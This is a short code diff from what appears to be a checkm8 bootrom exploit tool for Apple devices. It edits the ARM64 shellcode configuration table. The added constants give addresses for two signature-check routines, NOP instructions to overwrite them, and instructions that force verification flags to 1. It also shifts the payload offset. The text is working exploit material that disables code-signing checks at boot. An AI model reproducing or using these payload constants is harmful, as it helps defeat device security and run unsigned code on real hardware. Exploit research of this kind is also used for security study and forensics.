@@ -258,17 +258,24 @@ int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_32_
             config->payload_len = checkm8_payload_length_arm64;
             memcpy(config->payload, checkm8_payload_arm64, checkm8_payload_length_arm64);
             
-            shellcode_constants64 = (uint64_t[0x8]){
+            shellcode_constants64 = (uint64_t[0xd]){
                 0x180086B58,        // 1 - gUSBDescriptors
                 0x180086CDC,        // 2 - gUSBSerialNumber
                 0x10000BFEC,        // 3 - usb_create_string_descriptor
                 0x180080562,        // 4 - gUSBSRNMStringDescriptor
                 0x18037FC00,        // 5 - PAYLOAD_DEST
-                384,                // 6 - PAYLOAD_OFFSET
+                544,                // 6 - PAYLOAD_OFFSET
                 576,                // 7 - PAYLOAD_SIZE
                 0x180086C70,        // 8 - PAYLOAD_PTR
+                0x1000054e4,        // 9 - SIGCHECK_1
+                0xd503201fd503201f, // A - NOP_NOP
+                0x1000054b4,        // B - SIGCHECK_2
+                0x39029fe152800021, // C - movz w1, #0x1
+                                    //     strb w1, [sp, #0xa7]
+                0x3902abe13902a7e1, // D - strb w1, [sp, #0xa9]
+                                    //     strb w1, [sp, #0xaa]
             };
-            shellcode_constants_len = 0x8;
+            shellcode_constants_len = 0xd;
             
             usb_constants64 = (uint64_t[0x6]){
                 0x180380000,        // 1 - LOAD_ADDRESS
